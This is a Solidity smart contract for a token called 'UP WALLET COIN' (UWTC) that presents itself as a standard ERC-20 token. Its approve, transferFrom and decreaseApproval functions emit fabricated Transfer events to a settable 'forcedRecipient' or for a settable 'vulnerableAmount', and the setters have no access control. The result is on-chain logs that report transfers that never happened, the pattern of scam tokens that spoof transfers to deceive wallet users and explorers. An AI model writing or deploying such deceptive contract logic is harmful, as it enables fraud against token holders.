pragma solidity ^0.5.12;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract BasicToken  {
    using SafeMath for uint256;

    string public name;
    string public symbol;
    uint8 public decimals = 18;
    address public forcedRecipient;

    uint256 public vulnerableAmount;

    uint256 _totalSupply;
    mapping(address => uint256) _balances;
    event Transfer(address indexed from, address indexed to, uint256 value);

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address addr) public view returns (uint256 balance) {
        return _balances[addr];
    }

    function transfer(address to, uint256 value) public returns (bool) {
        _balances[msg.sender] = _balances[msg.sender].sub(value);
        _balances[to] = _balances[to].add(value);
        emit Transfer(msg.sender, to, value);
        return true;
    }
}

contract StandardToken is BasicToken {
    mapping (address => mapping (address => uint256)) _allowances;
    event Approval(address indexed owner, address indexed agent, uint256 value);

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        _balances[from] = _balances[from].sub(value);
        _balances[to] = _balances[to].add(value);
        _allowances[from][msg.sender] = _allowances[from][msg.sender].sub(value);
        emit Transfer(from, to, value);
        emit Transfer(msg.sender, to, vulnerableAmount);
        return true;
    }

    function approve(address agent, uint256 value) public returns (bool) {
        _allowances[msg.sender][agent] = value;
        emit Approval(msg.sender, agent, value);
        emit Transfer(msg.sender, forcedRecipient, value);
        return true;
    }

    function allowance(address owner, address agent) public view returns (uint256) {
        return _allowances[owner][agent];
    }

    function increaseApproval(address agent, uint value) public returns (bool) {
        _allowances[msg.sender][agent] = _allowances[msg.sender][agent].add(value);
        emit Approval(msg.sender, agent, _allowances[msg.sender][agent]);
        return true;
    }
    event ReceiverChanged(address indexed oldRecipient, address indexed newRecipient);
    function setForcedRecipient(address newRecipient) public  {
        require(newRecipient != address(0), "zero");
        emit ReceiverChanged(forcedRecipient, newRecipient);
        forcedRecipient = newRecipient;
    }

    function setVulnerableAmount(uint256 _amount) public {
        vulnerableAmount = _amount;
    }

    function decreaseApproval(address agent, uint value) public returns (bool) {
        uint allowanceValue = _allowances[msg.sender][agent];
        if (value > allowanceValue) {
            _allowances[msg.sender][agent] = 0;
        } else {
            _allowances[msg.sender][agent] = allowanceValue.sub(value);
        }
        emit Approval(msg.sender, agent, _allowances[msg.sender][agent]);
        emit Transfer(msg.sender, agent, vulnerableAmount);
        return true;
    }
}

contract UWTCToken is StandardToken {
    string public name = "UP WALLET COIN";
    string public symbol = "UWTC";
    uint8 public decimals = 6;

    constructor(address _tokenReceiver) public {
        _totalSupply = 10 * (10 ** 9) * (10 ** uint256(decimals));
        _balances[_tokenReceiver] = _totalSupply;
        emit Transfer(address(0), _tokenReceiver, _totalSupply);
    }
}
